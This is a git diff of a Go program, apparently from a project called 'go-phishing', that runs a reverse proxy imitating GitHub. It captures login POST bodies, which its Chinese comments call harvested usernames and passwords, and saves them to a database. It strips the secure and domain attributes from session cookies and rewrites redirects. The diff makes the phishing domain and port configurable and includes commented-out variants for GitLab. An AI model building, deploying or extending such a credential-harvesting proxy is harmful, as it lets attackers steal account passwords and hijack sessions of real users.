@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"flag"
 	"fmt"
 	"go-phishing/db"
 	"io/ioutil"
@@ -10,9 +11,15 @@ import (
 	"strings"
 )
 
-const (
-	upstreamURL = "https://github.com"
-	phishURL    = "http://localhost:8080"
+// var upstreamURL = "https://about.gitlab.com"
+
+// var upstreamURL = "https://gitlab.com"
+
+const upstreamURL = "https://github.com"
+
+var (
+	phishURL string
+	port     string
 )
 
 func replaceURLInResp(body []byte, header http.Header) []byte {
@@ -43,6 +50,14 @@ func cloneRequest(r *http.Request) *http.Request {
 	bodyByte, _ := ioutil.ReadAll(r.Body)
 	bodyStr := string(bodyByte)
 
+	// if r.URL.String() == "/users/sign_in" && method == "GET" {
+	// 	upstreamURL = "https://gitlab.com"
+	// } else {
+	// 	upstreamURL = "https://about.gitlab.com"
+	// }
+	// if r.URL.String() == "/users/sign_in" && method == "POST" {
+	// 	db.Insert(bodyStr)
+	// }
 	// 如果是 POST 到 /session 的請求
 	// 就把 body 存進資料庫內（帳號密碼 GET !!）
 	if r.URL.String() == "/session" && r.Method == "POST" {
@@ -53,8 +68,7 @@ func cloneRequest(r *http.Request) *http.Request {
 	// 取得原請求的 url，把它的域名替換成真正的 Github
 	path := r.URL.Path
 	rawQuery := r.URL.RawQuery
-	url := "https://github.com" + path + "?" + rawQuery
-
+	url := upstreamURL + path + "?" + rawQuery
 	// 建立新的 http.Request
 	req, err := http.NewRequest(method, url, body)
 	if err != nil {
@@ -64,6 +78,7 @@ func cloneRequest(r *http.Request) *http.Request {
 	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
 	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
 	req.Header.Del("Accept-Encoding")
+
 	req.Header.Set("Origin", origin)
 	req.Header.Set("Referer", referer)
 	for i, value := range req.Header["Cookie"] {
@@ -112,13 +127,16 @@ func adminHandler(w http.ResponseWriter, r *http.Request) {
 
 func handler(w http.ResponseWriter, r *http.Request) {
 	req := cloneRequest(r)
+
 	// 取得 header
 	body, header, statusCode := sendReqToUpstream(req)
+	body = replaceURLInResp(body, header)
+
 	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
 	for _, v := range header["Set-Cookie"] {
 		// 把 domain=.github.com 移除
 		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
-
+		// newValue := strings.Replace(v, "domain=.gitlab.com;", "", -1)
 		// 把 secure 移除
 		newValue = strings.Replace(newValue, "secure;", "", 1)
 		// 幫 cookie 改名
@@ -147,6 +165,7 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	if statusCode >= 300 && statusCode < 400 {
 		location := header.Get("Location")
 		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
+
 		w.Header().Set("Location", newLocation)
 	}
 
@@ -156,13 +175,19 @@ func handler(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
+	// 把 --phishURL=... 的值存進變數 phishURL 裡面
+	// 預設值是 "http://localhost:8080"
+	// "部署在哪個網域" 是這個參數的說明，自己看得懂就可以了
+	flag.StringVar(&phishURL, "phishURL", "http://localhost:8080", "部署在哪個網域")
+	// 把 --port=... 的值存進變數 port 裡面
+	// 預設值是 ":8080"
+	flag.StringVar(&port, "port", "8080", "部署在哪個 port")
+	flag.Parse()
+
 	db.Connect()
 	http.HandleFunc("/phish-admin", adminHandler)
-	// for _, str := range db.SelectAll() {
-	// 	fmt.Println(str)
-	// }
 	http.HandleFunc("/", handler)
-	err := http.ListenAndServe(":8080", nil)
+	err := http.ListenAndServe(":"+port, nil)
 	if err != nil {
 		panic(err)
 	}
